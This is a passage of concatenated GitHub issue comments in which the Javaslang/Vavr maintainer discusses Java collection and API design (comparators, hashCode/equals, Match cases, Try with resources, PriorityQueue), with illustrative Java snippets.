...\n    } else ...\n}\nMap cache = new ConcurrentHashMap<>();;\nClass<?> getTypeThatImplementsComparable(Object o) {\n    cache.computeIfAbsent(o.getClass(), c -> searchTypeHierarchy(c));\n}\nClass<?> searchTypeHierarchy(Class c) {\n    ...\n}\n```\nWill take a look tomorrow if this will work.\nUpdate: Because such a Comparator would be stateful, it could either not be a singleton any more or the cache has to be static. The latter case might be a bottleneck when the singleton comparator is used by (many?) threads in parallel... However, I tend to use a static cache because the number of types of an application that implement comparable are finite and searching the hierarchy is relatively cost-intensive.\n. There is still a problem (I already mentioned above: \"Checking for hashCode collisions would be problematic.\"): hash(o1, o2) can be 0 for o1 != o2.\nMaybe that can be fixed by returning an arbitrary int != 0 in that case, e.g. -1.\nBut if we do so, the whole hash(o1, o2) makes no sense any more. We should return -1 instead. Especially compare(o1, o2) == -1 == compare(o2, o1) in the unordered case. Don't know if that makes still sense regarding the RedBlackTree implementation...\nUpdate: Of course this does not make any sense at all (using -1 instead of hash(o1, o2)) because binary search within the tree isn't possible any more. It is undecidable if we should further search in the left branch or in the right branch of the tree.\nUpdate 2: It would be sufficient if the comparator returns an int &in {-1, 0, 1}. Given that we could also use unique long values to compare objects. But object addresses (JVM spec: 'type references') cannot be used because addresses may change during garbage collection (GC).\nUpdate 3: o1.hashCode() - o2.hashCode() is not a good solution in general. See Oracle docs: \n\n\"This trick does not work in general because the signed integer type is not big enough to represent the difference of two arbitrary signed integers.\"\n. I know but I see no other solution than using reflection - or breaking backward compatibility by returning Set instead of SortedSet.\n\nEven in the reflection-variant that detects hash-collisions, there might come a SecurityManager into the way (see code below).\nThis looks way too complicated. The simplest solution seems to be the best: breaking backward-compatibility :-/\nUpdate/Note: I think also a cycle detection is needed in the solution below (for mutable objects that contain a self-reference in a field...).\n``` java\nfinal class ObjectComparator implements java.util.Comparator, Serializable {\nprivate static final long serialVersionUID = 1L;\n\nprivate static final ObjectComparator<Object> INSTANCE = new ObjectComparator<>();\n\nprivate ObjectComparator() {\n}\n\n@SuppressWarnings(\"unchecked\")\nstatic <T> ObjectComparator<T> instance() {\n    return (ObjectComparator<T>) INSTANCE;\n}\n\n@Override\npublic int compare(T o1, T o2) {\n    if (o1 == o2) {\n        return 0;\n    } else if (o1 == null) {\n        return -1;\n    } else if (o2 == null) {\n        return 1;\n    } else {\n        final Class<?> type1 = o1.getClass();\n        final Class<?> type2 = o2.getClass();\n        if (type1 == type2) {\n            if (o1 instanceof Comparable) {\n                return naturalOrder(o1, o2);\n            } else if (o1.equals(o2)) {\n                return 0;\n            } else {\n                return pseudoOrder(o1, o2);\n            }\n        } else {\n            if (exisitsCommonComparableType(type1, type2)) {\n                return naturalOrder(o1, o2);\n            } else if (existsCommonComparableType(type2, type1)) {\n                return -naturalOrder(o2, o1);\n            } else if (o1.equals(o2) || o2.equals(o1)) {\n                return 0;\n            } else {\n                return pseudoOrder(o1, o2);\n            }\n        }\n    }\n}\n\n@SuppressWarnings(\"unchecked\")\nprivate static int naturalOrder(Object o1, Object o2) {\n    return ((Comparable<Object>) o1).compareTo(o2);\n}\n\nprivate static int pseudoOrder(Object o1, Object o2) {\n    final int hash1 = o1.hashCode();\n    final int hash2 = o2.hashCode();\n    // just return -1/1 because an overflow of hash1 - hash2 could also result in a collision\n    if (hash1 < hash2) {\n        return -1;\n    } else if (hash1 > hash2) {\n        return 1;\n    } else {\n        // resolve hash collision\n        final String name1 = o1.getClass().getName();\n        final String name2 = o2.getClass().getName();\n        final int nameCompare = name1.compareTo(name2);\n        if (nameCompare != 0) {\n            return nameCompare;\n        } else {\n            try {\n                // o1.getClass() == o2.getClass()\n                Class<?> clazz = o1.getClass();\n                while (clazz != null) {\n                    // nameCompare == 0 => fields of o1 and o2 are the same\n                    final Field[] fields = clazz.getDeclaredFields();\n                    for (Field field : fields) {\n                        field.setAccessible(true);\n                        final Object value1 = field.get(o1);\n                        final Object value2 = field.get(o2);\n                        final int fieldOrder = INSTANCE.compare(value1, value2);\n                        if (fieldOrder != 0) {\n                            return fieldOrder;\n                        }\n                    }\n                    // if all fields are the same then go to super class and compare fields\n                    clazz = clazz.getSuperclass();\n                }\n                return 0;\n            } catch(Throwable x) {\n                // there is nothing more we can do at this point to induce a pseudo object-order\n                throw new IllegalStateException(\"Error comparing \" + o1 + \" and \" + o2, x);\n            }\n        }\n    }\n}\n\nprivate static boolean existsCommonComparableType(Object o1, Object o2) {\n    ...\n}\n\n@Override\npublic boolean equals(Object obj) {\n    return obj == this;\n}\n\n@Override\npublic String toString() {\n    return \"ObjectComparator\";\n}\n\n/**\n * Instance control for object serialization.\n *\n * @return The singleton instance of ObjectComparator.\n * @see java.io.Serializable\n */\nprivate Object readResolve() {\n    return INSTANCE;\n}\n\n}\n```\nThis whole thing above is a big smell...\n. > Just returning -1 seems like the only plausible way to resolve the hash collision, but that itself smells as well.\nIt is not only a smell, it is a *blocker for that solution. Imagine the TreeSet.contains(value) method. The underlying RedBlackTree performs a binary search along the left/right tree branches. If we just return -1 (see above) then the 'real' comparison result may be 1 and the binary search goes terribly wrong because we do not find node that is already contained in the tree.\nI agree that it is a tough decision to break the API by returning a Set instead of a SortedSet. But 'inventing' a comparator is also no good idea. In many cases operations on SortedSets having that comparator will be reasonable fast but I guess there exist executions where it starts to get relatively slow. This is unexpected behavior and may create headaches.\nI see no other solution that returning a Set.\n. Thank you, I will run it. Best would be to automate it as part of the CI build.\nThe Iterator.next method intentionally does not throw. The iterator is used internally and there is no chance that it ever will escape to the outside or throw a NoSuchElementException. Usage:\n``` java\n    interface StreamFactory {\n    static <T> Stream<T> create(java.util.Iterator<? extends T> iterator) {\n        return iterator.hasNext() ? Stream.cons(iterator.next(), () -> create(iterator)) : Empty.instance();\n    }\n}\n\n```\nThat's one thing that drives me crazy about FindBugs, PMD et al. These tools are good to spot blockers and major bugs. But when it comes to code optimizations they are a real pain in the ass.\n. Thank you Martti!\nI ran FindBugs in IntelliJ and it helped!\n. I investigated all FindBugs findings. All should work fine with the exception of one finding which has to be fixed - after deserializing a HashMap/HashSet the hashCode function will fail. It will be fixed with 2.0.2.\n. Hi Grzegorz, Sputnik looks great! I will give it a try.\nI'm curious, in the past I got a little mad with PMD. Also some FindBug findings in Javaslang are no errors.\nThanks and happy easter!\n. @pivovarit would that be something you could do (Sputnik integration)?\n. @pivovarit just one question: I'm curious why Sputnik needs admin-rights for repository webhooks and services. Aren't write right enough!?\n\n. @pivovarit which checkstyle settings do you suggest? Default/Sub/Google? Currently I have Default selected but thinking about enabling Google...\n. Hi @pjagielski, could you please clarify why Sputnik needs admin-rights (see comment above)?\n. @pjagielski Ok, I understand :) A hint somewhere might help users.\n. Hi Benoit,\nyou're right, it is a bug. For2 to For8 need to use Stream instead of Iterator internally.\nI will prepare a fix 2.0.2.\n- Daniel\n. ## Retest after #1246 has been implemented!\nThere is a chance that this issue is obsolete then.\n. [BUG]\nIt seems HashArrayMappedTrie hashCode and equals are not symmetric. I noticed it when simplifying the equals/hashCode impls of collections.\nIt makes sense to define that two HAMT's are equal, if their structure and their contained values are equal. That means that I will update the equals method of HAMT and take care that no collection relies on comparing their backends by HAMT.equals.\nThe same applies for RedBlackTrees (needs to be checked).\n. HAMT equals and hashCode should be expressed independent of the order of elements. In other words, it does not matter how HAMT(and RedBlackTree) structures store values. Only the values matter.\n- HAMT hashCode should be expressed by applying XOR to the hashCode of all entries. XOR is commutative and equally distributed (50% 0, 50% 1). See https://stackoverflow.com/questions/5889238/why-is-xor-the-default-way-to-combine-hashes\n- HAMT equals should be expressed by checking key sets for equality and then check if values are congruent. size()-check may be also used for optimization, it is O(1)\nThis strategy allows us to delegate equals and hashCode to an underlying HAMT backend\n. Fixed\n. Great, thank you!\n. Arrgh. Note to myself: never ever copy-paste asciidoc to markdown\nThanks!\n. Successfully finished.\n. Hi Edgar,\nI saw your announcement of adding Javaslang as dependency to jooby. Thanks for using it!\nThe \u03bbModule.ReflectionUtil was removed starting with Javaslang 2.0.0. Which version do you currently use?\nI chatted with Brian Goetz on Twitter. The lambda serialization is not a stable feature that applications should use to get runtime informations about functions. It is a hack. Javaslang used it for the old 1.x Match API. The new 2.0 Match API does not need it any more.\nI'm sure that your use-case can be expressed directly, without these hacks. Do you have some code that I can take a look at? What is the API you are modelling hand how the semantics are specified? Maybe I can show you a way how to express it effectively with Javaslang.\n. Yes, I understand. I've studied the jooby docs and also had a look at other http rooting impls.\nI like jooby's take on rooting by defining handlers 'on-the-fly' in an instance initializer without the need of controller classes. Indeed, I also see no other possibility than dynamically inspecting the lambda types at runtime to parse and convert the request parameters.\nStatically compiling rooting files like the Play Framework or using compile time annotations @GET(\"/:id\") go not adhere with the philosophy of jooby.\nSo I think I can support you by adding lambda reflection as a public feature. I will release it in 2.1.0.\nI think reflection should be used with caution. To make it a little bit harder to use that feature I could place it in the interface \u03bb, which is hard to type :)\n``` java\ninterface \u03bb {\nstatic Type getType(Serializable lambda) {\n    // ...\n}\n\ninterface Type {\n    int getParameterCount();\n    String getParameterName(int index); // <--- I think that should be also possible\n    Class<?> getParameterType(int index);\n    Class<?> getReturnType();\n}\n\n}\n```\nWhat do you think? Would that help?\n. @jknack But beware, there are special cases:\n- lambda reflection does not work for all kind of lambdas. method references don't work I think, e.g. get(\"/:id\", this::getPerson)\n- when effectively final variables are captured, the reflected lambda Type will include them as lambda parameters, e.g.\njava\nclass App {\n    {\n        final String doh = ...;\n        get(\"/:id\", (String id, Integer foo) -> {\n            // do sth with 'doh'\n            return ...;\n        });\n    }\n}\nHere the reflected lambda type will have 3 parameters: String id, Integer foo and String ???. I don't know if the name of a captured arg can be also reflected. Need to take a look...\nBut I think it might also be possible to provide a function\njava\nboolean isParameterCaptured(int index);\nUpdate: The captured args can be muted completely, we do not have to deal with them.\n. It is ok, I will add it to the \u03bb interface, it is a general purpose functionality there. The getType() of (Checked)Function1..(Checked)Function8 will not be added. I don't want to have it as standard functionality for arbitrary functions because it is fragile. But under certain circumstances it might make sense to do lambda reflection.\n. Info: There are JVM changes in the pipeline (\"Project Panama\" / new Vector API, however, no due date) that require runtime lambda reflection (see this video).\n. There are several problems with this kind of reflection.\n1. Brian Goetz told me that it is 'thin ice'. He would not build features upon lambda reflection.\n2. it does only work for lambdas. If we pass a method reference, it will throw at runtime\n3. it is relatively slow\n4. gwt does not support reflection\nTherefore we will not ship this feature with Javaslang. If it is really needed I recommend to copy/paste the code Javaslang once contained (must have been in a RC before 2.0.0 final)\n. Super-awesome work!!!\n. Aaaand... merged :)\nMany thanks, great feature!\n. This is not possible everywhere. E.g. we need it in LinkedHashMap.Builder:\njava\n@Override\npublic <K, V2 extends V> LinkedHashMultimap<K, V2> ofEntries(Iterable<? extends Tuple2<? extends K, ? extends V2>> entries) {\n    return build(entries, Tuple2::_1, Tuple2::_2, (OfMap<K, V2, LinkedHashMultimap<K, V2>>) this::ofMap);\n}\nin order to use it as finisher for a Collector:\njava\n@Override\npublic <K, V2 extends V> Collector<Tuple2<K, V2>, ArrayList<Tuple2<K, V2>>, LinkedHashMultimap<K, V2>> collector() {\n    final Supplier<ArrayList<Tuple2<K, V2>>> supplier = ArrayList::new;\n    final BiConsumer<ArrayList<Tuple2<K, V2>>, Tuple2<K, V2>> accumulator = ArrayList::add;\n    final BinaryOperator<ArrayList<Tuple2<K, V2>>> combiner = (left, right) -> {\n        left.addAll(right);\n        return left;\n    };\n    return Collector.of(supplier, accumulator, combiner, this::ofEntries);\n}\n. Code works fine, no hurry here. But we definitely should check all bounds. Will move it to 2.2.0.\n. Not possible as stated above.\n. Towards #1235\n. Ok, thx\n. Thanks Martti, I will check those out.\nJavaslang needs to be stable on minor releases!\n. I don't see the reason why to have NonEmptyList. Why not use List.Cons instead?\nI will close this issue, it looks artificial to have such an interface only for List but not for all Traversables or at least for all sequences. But that would be too much for Vavr.. Hi Nicholas,\nvery nice - well done! I have one question - please see the review comment.\nMany thanks!\nDaniel\nBtw: I saw your project euler github project. We also have projecteuler tests for the case you are interested in adding ones: https://github.com/javaslang/javaslang/tree/master/javaslang/src/test/java/javaslang/collection/euler\n. Hi Nicholas, sorry for being so silent - I was on vacation with my family and had no internet - only mountains, air, snow and sun :-)\nYour PR looks great. Many thanks!\n@ruslansennov maybe I need a deputy... I will write up some thoughts in an email tomorrow.\n. Hi Edgar,\nthere where ambiguities (see #1207). I had to remove Case methods to fix it.\nI looks like I removed too many methods. In fact I can add more methods having a Supplier.\nOnly the Case(T, Function) needs to be removed because it introduces ambiguities.\nI will fix that and prepare a 2.0.2 today. It will be available tomorrow. I have also a For fix in the pipeline.\nGreets\nDaniel\n``` java\nimport javaslang.API.Match.Case;\nimport javaslang.API.Match.Pattern0;\nimport java.util.function.Function;\nimport java.util.function.Predicate;\nimport java.util.function.Supplier;\nimport static javaslang.API.$;\npublic class Test {\npublic static void main(String[] args) {\n\n    // Case(\"1\", o -> \"ok\"); // Not possible, would lead to ambiguities\n    Case(\"1\", () -> \"ok\");\n    Case(\"1\", \"ok\");\n\n    Predicate<String> p = s -> true;\n    Case(p, o -> \"ok\"); // Ambiguous, if Case *XXX* is present (see below)\n    Case(p, () -> \"ok\");\n    Case(p, \"ok\");\n\n    Case(o -> true, o -> \"ok\"); // Ambiguous, if Case *XXX* is present (see below)\n    Case(o -> true, () -> \"ok\");\n    Case(o -> true, \"ok\");\n\n    Case($(\"1\"), o -> \"ok\"); // Ambiguous, if Case *XXX* is present (see below)\n    Case($(\"1\"), () -> \"ok\");\n    Case($(\"1\"), \"ok\");\n\n}\n\n// -- R\n\n//    // XXX => leads to ambiguities (see above)\n//    public static  Case Case(T value, Function<? super T, ? extends R> f) {\n//        return null;\n//    }\npublic static <T, R> Case<T, R> Case(T value, Supplier<? extends R> f) {\n    return null;\n}\n\npublic static <T, R> Case<T, R> Case(T value, R retVal) {\n    return null;\n}\n\n// -- Predicate\n\npublic static <T, R> Case<T, R> Case(Predicate<? super T> predicate, Function<? super T, ? extends R> f) {\n    return null;\n}\n\n// not part of 2.0.1 but may be added\npublic static <T, R> Case<T, R> Case(Predicate<? super T> predicate, Supplier<? extends R> f) {\n    return null;\n}\n\npublic static <T, R> Case<T, R> Case(Predicate<? super T> predicate, R retVal) {\n    return null;\n}\n\n// -- Pattern0\n\npublic static <T, R> Case<T, R> Case(Pattern0<T> pattern, Function<? super T, ? extends R> f) {\n    return null;\n}\n\n// not part of 2.0.1 but may be added\npublic static <T, R> Case<T, R> Case(Pattern0<T> pattern, Supplier<? extends R> f) {\n    return null;\n}\n\npublic static <T, R> Case<T, R> Case(Pattern0<T> pattern, R retVal) {\n    return null;\n}\n\n}\n```\n. > does it help?\nWe don't need it. All the Case methods which are not commented out in the example I provided above are valid. Only the method I marked with XXX is not possible.\n\nAlso, think a built-in default case will be helpful too\n\nWe write the default case like in Scala:\nscala\n// scala\no match {\n    case _ => \"?\"\n}\nCurrent API:\n``` java\n// javaslang\nMatch(o).of(\n    Case($(), \"?\")\n)\nMatch(o).option(\n    // cases\n).getOrElse(\"?\")\nMatch(o).option(\n    // cases\n).getOrElseThrow(IllegalArgumentException::new)\n```\n\nIdeally/Optionally, the special Case_ could throw an Exception\n\nActually it does. If no Case matches a MatchError is thrown.\nBtw: The Case($(), ...) is 'for free', because $() returns a typed singleton.\n. Many thanks for your finding. Next time I will take more care when changing APIs.\n. Edgar, I can't manage to publish 2.0.2 today. I'm on vacation with my family starting tomorrow for one week. I want to get the time to test it before it gets released.\n- Daniel\n. Thx! :)\n. @jknack I managed to release it today. See https://github.com/javaslang/javaslang/releases/tag/v2.0.2\n(It will take some hours until Maven Central Search shows the release. If you update the version in your project, it will probably work find it though.)\n. :-)\n. Great we've found it!\n. Fixes #1243 \n. @sajit In general, the split result will be further processed.\nWe want to write:\njava\nCharSeq.of(csvLine).split(\";\").map(String::trim);\nbut having a result of type CharSeq[] we currently are forced to write\njava\nVector.of(CharSeq.of(csvLine).split(\";\")).map(String::trim);\n. Thanks guys! Seems @gde-vt also fixed this issue on a local branch :)\n. Hey guys,\nI've sleepless nights because this little change will break backward compatibility which may be a major issue regarding transitive library dependencies (e.g. two maven libs, one depends on the other, both use different Javaslang versions that are not compatible).\nSuch a change as this should\n- either be made in a major release\n- or we need to add an additional method without changing the original one\nSo we could defer this change to Javaslang 3.0.0 or introduce new methods, e.g. splitSeq.\nWhat do you think @sajit, @ruslansennov, @paplorinc ?\n/cc @jest \n. I'm fighting with myself - targeting the most simple API possible, the new method's name would be split.\nIf we name it splitSeq and remove split in 3.0.0 we still have the problem that a third party lib that uses a 2.x version of Javaslang will not work any more if we use both in a new application, the third party lib and Javaslang 3.0.0. Maven for example will resolve the dependency conflict and choose Javaslang 3.0.0 over 2.x. The third party lib will then be forced to use Javaslang 3.0.0 at runtime, even if it is compiled against 2.x.\nNow we are in backward-compatibility hell, like Java. We could keep the current split instead of deprecating and removing it. But from a birds-view this is a big problem. It would be like a stagnation in the evolution of the API and we would keep mistakes forever, duplicate similar methods like in this case and so on.\nWhat we really want here is to adjust the return type of split. Choosing a new name is the attempt to be backward compatible. Removing the current split will break backward compatibility (as stated above).\nSo I have another solution: We create a 3.0.0 branch and start the development of the next version right now. There we will keep the split method and adjust the return type. If methods are removed completely in the next version we will deprecate them in the current version. This is not the case here, so we may add a hint to the javadocs of the current version.\nI think that it is essential for the health of Javaslang to be able to make major changes immediately instead of deferring them to the next major version using github issues. Eventually there will be so much changes that no-one is able to effort the time to play them back when it is time for a major update. Also we will not need any TODO markers. We will keep master and 3.0.0 branch in sync be merging frequently, ideally after each PR.\n@paplorinc It should be easy to cut the splitSeq part of your PR #1296 and place it in the 3.0.0 branch.\n. I created a 3.0.0 branch. The future is right ahead of us :-)\n. This would be a solution to the problem but I think it is overkill. All versions of the API will be persistent forever. Bugs have to be fixed in all existing versions. We should no do that.\nMaybe the Java 9 module system will come to the rescue?\n. Thx!\n. You are right! Partial apply should not throw. I will change that. It was an oversight.\n. @pivovarit good point! I will open an issue to enhance the ci-build to detect evil commits of generated sources.\nIt is as @talios said - I want to see the changes in code reviews. And I want to browse the actual code online :-)\n. LGTM! Thx\n. Awesome! Thx for improving the test-framework :)\n. Yep, please compute, eh, implement them, they are absent. :)\n. Good point!\ncomputeIfAbsent makes only sense for mutable collections. It comes handy when lazy evaluating values (e.g. for cache application). For example we use it in Function1:\njava\n    @Override\n    default Function1<T1, R> memoized() {\n        if (isMemoized()) {\n            return this;\n        } else {\n            final Lazy<R> forNull = Lazy.of(() -> apply(null));\n            final Object lock = new Object();\n            final java.util.Map<T1, R> cache = new java.util.HashMap<>();\n            return (Function1<T1, R> & Memoized) t1 -> {\n                if (t1 == null) {\n                    return forNull.get();\n                } else {\n                    final R result;\n                    synchronized (lock) {\n                        result = cache.computeIfAbsent(t1, this::apply);\n                    }\n                    return result;\n                }\n            };\n        }\n    }\nThe mutable cache is automatically updated if the value is not present.\nUpdate: I actually don't know why we handle the null-key case special here. HashMap permits the null key. I think it is historical code because before we used ConcurrentHashMap, which does not allow null key or values. (We replaced ConcurrentHashMap because it introduced problems in a concurrent setting! I think it is buggy.) I will create an issue for simplifying it (see #1286). Also we can return from within the synchronized block:\njava\n    @Override\n    default Function1<T1, R> memoized() {\n        if (isMemoized()) {\n            return this;\n        } else {\n            final Object lock = new Object();\n            final java.util.Map<T1, R> cache = new java.util.HashMap<>();\n            return (Function1<T1, R> & Memoized) t1 -> {\n                synchronized (lock) {\n                    return cache.computeIfAbsent(t1, this::apply);\n                }\n            };\n        }\n    }\n\nAn immutable Map can't update its internal state. Therefore the updated collection has to be returned along with the value:\njava\nTuple2<V, ? extends Map<K, V>> computeIfAbsent(K key, Function<? super K, ? extends V> mappingFunction) {\n    return getOption(key).map(value -> Tuple.of(value, this)).getOrElse(() -> {\n        final V value = f.apply(key);\n        return Tuple.of(value, put(key, value));\n    });\n}\nThe point of computeIfAbsent is to compute the value only once. Subsequent calls with the same key should return the 'cached' value. Function0..8 support this behavior using a memoized() version of the function.\n\nHaving this in mind we could achieve the same by using:\njava\nFunction<K, V> f = myMap.withDefault(mappingFunction).memoized();\nDo you think computeIfAbsent is practicable?\n- on each call Tuple instances are created\n- the caller is responsible for updating the Map reference with the Map returned in the Tuple\n. @paplorinc Currently I don't see the need for getOrElse(key, supplier). Java 8's computeIfAbsent method does cache the value once it is computed.\nThe correct immutable implementation of computeIfAbsent is\njava\n// Note: SortedMap.computeIfAbsent returns Tuple2<V, ? extends SortedMap<K, V>> etc.\nTuple2<V, ? extends Map<K, V>> computeIfAbsent(K key, Function<? super K, ? extends V> mappingFunction) {\n    return get(key).map(value -> Tuple.of(value, this)).getOrElse(() -> {\n        final V value = f.apply(key);\n        return Tuple.of(value, put(key, value));\n    });\n}\nThe original question of this issue is to add computeIfPresent, which is relatively simple:\njava\nOption<V> computeIfPresent(K key, BiFunction<? super K,? super V,? extends V> remappingFunction) {\n    return get(key).map(value -> remappingFunction.apply(key, value));\n}\n. thx!\n. I have this also in mind. We need to abstract over it. Basically it is IO related - with resource cleanup. Java has AutoClosable and try with resources. The main pain point is maintaining composability. E.g. assuming we have monads that capture some state depending on a resource, compining those requires to ensure cleaning up all resources under all circumstances (failure, exhaustive read, ...)\nI don't think we should couple this directly with Try. It would fit also great to the Stream collection.\nNeed time to think about it...\n. Hi @mladenbolic,\nnice idea, we could add _finally(r) as shortcut for onFailure(t -> r.run()).andThen(r) where r is a CheckedRunnable.\nfinally is a keyword, so we need an alternative. E.g. _finally or Finally (both ugly) or finallyRun.\n. @jknack Oh sorry, I've overseen on my small phone display that you suggested always - I forgot because it has been 12 days ago.\n@jknack, @mladenbolic: Our current approach is not complete. We need to capture the resources in a 'safe' context when creating them. We can do better by abstracting over it:\njava\n// AutoCloseable resources are supplied and automatically closed on error or when Try was executed\nWithResources(...).Try(...); // again upper-cases for methods, like in Match and For (...) :-/\nAn example:\njava\nTry<String> result = WithResources(this::getSession).Try(session -> \"ok\");\nbecause the result is a Try, we also could implement always or finallyRun or Finally:\njava\nTry<String> result = WithResources(this::getSession).Try(session -> \"ok\").Finally(() -> { ... });\nPlease note that we do not need Finally to close the resources - that is done automatically. However, of cause we could close resources in Finally if we do not use a WithResourcescontext:\njava\nTry<String> result = Try.of(() -> \"ok\").Finally(() -> { /* close resources */ });\nThat is a functional try-with-resources!\n\nWe are currently able to support up to 8 resources because we have Function1, ..., Function8.\nHere is an example for just one resource:\n``` java\n// the API interface exists. Usage: import javaslang.API.*;\ninterface API {\nstatic <A1 extends AutoCloseable> WithResources1<A1> WithResources(Try.CheckedSupplier<A1> supplier1) {\n    // DEV-NOTE: We need an anonymous class instead of a lambda because 'the target method is generic'.\n    return new WithResources1<A1>() {\n        @Override\n        public <R> Try<R> Try(CheckedFunction1<A1, R> f) {\n            try(A1 autoCloseable1 = supplier1.get()) {\n                return Try.success(f.apply(autoCloseable1));\n            } catch (Throwable x) {\n                return Try.failure(x);\n            }\n        }\n    };\n}\n\n@FunctionalInterface\ninterface WithResources1<A1 extends AutoCloseable> {\n    <R> Try<R> Try(CheckedFunction1<A1, R> f);\n}\n\n}\n```\n\nI think we additionally need to provide side-effecting variants WithResources(...).run(CheckedConsumer1..8).The functional interfaces Consumer1..8 and CheckedConsumer1..8 currently do not exist.\n. @jknack, @mladenbolic that makes pretty much sense. I like your idea to keep things in one place. I also like the first proposal of @jknack.\nTry has currently 950 lines of code. I need to move the class completely into Generator.scala to generate the with methods (because we do not have protected regions). That should be no problem. I will provide a version tomorrow...\n. I hadn't the time yet to modify the generator but I'm on it.\nIn the meanwhile one thing came to my mind:\nInstead of\njava\n// Solution 1\nTry.with(this::getSession, session -> ...)\nwe could provide a curried form:\n``` java\n// Solution 2\nTry.with(this::getSession).of(session -> ...)\n// or name it 'apply'\nTry.with(this::getSession).apply(session -> ...)\n```\nAn implementation could look like this:\n``` java\ninterface Try {\n// Solution 1\n\nstatic <R, A1 extends AutoCloseable> Try<R> with(CheckedSupplier<A1> supplier1, CheckedFunction1<A1, R> f) {\n    try (A1 autoCloseable1 = supplier1.get()) {\n        return Try.success(f.apply(autoCloseable1));\n    } catch (Throwable x) {\n        return Try.failure(x);\n    }\n}\n\n// Solution 2\n\nstatic <A1 extends AutoCloseable> TryWith1<A1> with(CheckedSupplier<A1> supplier1) {\n    // DEV-NOTE: We need an anonymous class instead of a lambda because 'the target method is generic'.\n    return new TryWith1<A1>() {\n        @Override\n        public <R> Try<R> of(CheckedFunction1<A1, R> f) {\n            try (A1 autoCloseable1 = supplier1.get()) {\n                return Try.success(f.apply(autoCloseable1));\n            } catch (Throwable x) {\n                return Try.failure(x);\n            }\n        }\n    };\n}\n\n@FunctionalInterface\ninterface TryWith1<A1 extends AutoCloseable> {\n    <R> Try<R> of(CheckedFunction1<A1, R> f);\n}\n\n}\n```\nThe pro of solution 2 is that a TryWith is reusable, i.e. given a set of resource suppliers we could perform different computations:\njava\nTryWith1<Session> tryWith = Try.with(this::getSession);\nTry<Boolean> result1 = tryWith.of(session -> true);\nTry<String> result2 = tryWith.of(session -> \"ok\");\nAnother idea that comes to my mind while writing these lines is to provide notation where provides resources may depend on each other - similar to a for comprehension:\njava\nTry<R> result =\n    Try.with(this::getConnection, connection ->\n        Try.with(() -> connection.prepareStatement(...)).of(preparedStatement ->\n            ...\n        )\n    );\nThis notation is similar to For-comprehensions (in Javaslang):\njava\nIterator<String> iterator =\n    For(persons.filter(Person::hasAddress), p ->\n        For(p.addresses).yield(a ->\n             p.name + \",\" + a.street\n        )\n    );\n. Status update:\nWe are now able to act on AutoCloseables and finally run code:\njava\nTry.withResources(/*resource-suppliers*/)\n   .of(/*resource-processor*/)\n   .andFinally(/*unit-of-code*/);\n(see vavr-0.9.0: Try)\nNext we will add the side-effecting run API by introducing CheckedConsumer1..8:\njava\nTry.withResources(/*resource-suppliers*/)\n   .run(/*resource-consumer*/)\n   .andFinally(/*unit-of-code*/);\n. Vavr 1.0 reduces the API surface area. Instead of adding an internal DSL to mimic the existing try/catch/finally, we use it directly (within a Try.of or Try.run). Hi Pap, this is a great idea. I'm returning home from vacation and have currently only my mobile phone at hand. My thoughts:\n- we need to decide how the PriorityQueue fits into the type hierarchy of the Javaslang collections. Maybe we need to change the existing types (interfaces vs classes). Currently we have a class Queue which is a LinearSeq -> Seq -> Traversable. It would be nice to have a Queue interface but I think the PriorityQueue interface differs regarding the enqueue operation regarding the rank. I think that a PriorityQueue is no Seq. It is also not a Map. Is it a Set? What if we insert the same element with different priorities? (see this discussion: http://www.scala-lang.org/old/node/10374.html). Maybe it needs to be a new collection type that extends Traversable, like Tree and Iterator. I have to read more about it tomorrow...\n- the Okasaki paper you referred to is of 1996. More recent sources refer to FingerTree impls (https://hackage.haskell.org/package/fingertree-0.1.1.0/docs/Data-PriorityQueue-FingerTree.html, http://stackoverflow.com/questions/18127422/is-there-a-maintained-immutable-priority-queue-in-scala). We need to check the pros/cons compared to binary tree/heap impls\nTomorrow I'm able to provide you with some more detailed information.\nThis will be fun :)\n. @paplorinc We add the PriorityQueue as interface to the existing type hierarchy:\n\nA (FIFO) Queue is a special Priority Queue (\"... the priority of each inserted element is monotonically decreasing\", see wikipedia). Please note that a Stack is also a special Priority Queue but in Javaslang the Stack is not a collection but a marker interface with a bunch of Stack operations, so Stack will not implement Priority Queue.\nBefore talking about implementation details there is still a question (and I already have a suggested answer):\nWhich API do we choose to assign an element a priority?\n\nProvide an explicit priority as argument when pushing an element to the Priority Queue\nDefine an underlying ordering (= Comparator) when constructing a Priority Queue (much like in TreeSet)\n\nThe first approach (using an explicit priority) is not intuitive because we may easily add one element with different priorities. The priority on the one hand is bound to an element but on the other hand it is not derived from that element. If the priority is independent of the element attributes, it can be seen as arbitrary/random from our viewpoint.\nThe second approach (using an ordering) goes well along with Java's standard collection. It implemented a mutable Priority Queue using an underlying Comparator. A Comparator provides us with more options, we are able to create a Priority Queue using a rank/priority function priority: T -> int that induces a Comparator compare: T x T -> int:\njava\ncompare(elem1, elem2) := priority(elem2) - priority(elem1)\nChoosing the right implementation\nUsing Heaps is just one variant to implement Priority Queues. Let's take the approach you suggested. I think it is nice because it is relatively easy. The performance characteristics are ok and we are able to exchange the implementation later because Priority Queue will be an interface and we do not expose the implementation details to the outside.\nFirst implementation steps\nThe interface looks like this:\n``` java\npublic interface PriorityQueue extends LinearSeq {\nTuple2<T, ? extends PriorityQueue<T>> dequeue();\nOption<Tuple2<T, ? extends PriorityQueue<T>>> dequeueOption();\nPriorityQueue<T> enqueue(T element);\nPriorityQueue<T> enqueue(T... elements);\nPriorityQueue<T> enqueueAll(Iterable<? extends T> elements);\nT peek();\nOption<T> peekOption();\n\n// -- Adjusted return types of LinearSeq methods\n\n...\n\n}\n```\nNote: The adjusted return types mentioned above mean that methods inherited from LinearSeq that return LinearSeq need (in 99,99% of all cases) to be overridden with PriorityQueue as return type.\nAccordingly we need to change class Queue:\n``` java\n// before\npublic class Queue implements Kind1, T>, LinearSeq, Serializable {\n    ...\n}\n// after\npublic class Queue implements Kind1, T>, PriorityQueue, Serializable {\n    ...\n}\n```\nStill ~~unsatisfied~~ undecided with the type hierarchy...\nAbove we see two disadvantages of letting Queue inherit PriorityQueue:\n1. Some of the method return types of PriorityQueue contain ? extends PriorityQueue<T> because of Java's lack of (declaration site) variance. This is somewhat distracting API.\n2. PriorityQueue<T> cannot extend Kind1<PriorityQueue<?>, T> because it would be a conflict to Queue<T> implements Kind1<Queue<?>, T>. This is a minor issue because Kind* is only relevant for the javaslang-pure module.\nThe second point can be ignored for now. The first point might be fixed by leaving PriorityQueue as standalone type that is not implemented by Queue.\n@all Any opinions on that? I've experimented with Set and Map return types and think that it is ok to work with ? extends ... return types (no casts were needed).\n. I slept one night over the type-hierarchy topic. In the comment above I suggested the 